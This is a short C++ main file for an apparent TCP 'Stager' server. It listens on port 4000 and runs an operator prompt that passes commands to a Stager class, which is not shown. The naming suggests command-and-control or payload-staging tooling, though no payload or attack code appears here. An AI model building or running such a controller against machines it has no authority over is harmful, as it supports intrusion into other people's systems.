#include "Stager.h"

using namespace MNet;

int main()
{

	if (not WSA::StartUp())
	{
		std::cout << "Failed to start up Winsock." << std::endl;
	}
	
	std::string input;
	Stager TCPStager;
	if (not TCPStager.Listen("4000"))
	{
		std::cout << "Server initialization failed." << std::endl;
		ExitProcess(1);
	}

	// print help when loading the stager for the first time.
	TCPStager.PrintHelp();
	bool _exit = true;

	do
	{
		input.clear();

		std::cout << ">> ";
		std::getline(std::cin, input);

		if (input == "")
			continue;

		else if (input == "--quit")
			break;

		else if (input == "--help")
			TCPStager.PrintHelp();

		else
			_exit = TCPStager.Logic(input);

	} while (_exit);

	if (not TCPStager.ShutDown())
	{
		std::cout << "Server shutdown failed." << std::endl;
		ExitProcess(1);
	}
	WSA::ShutDown();

}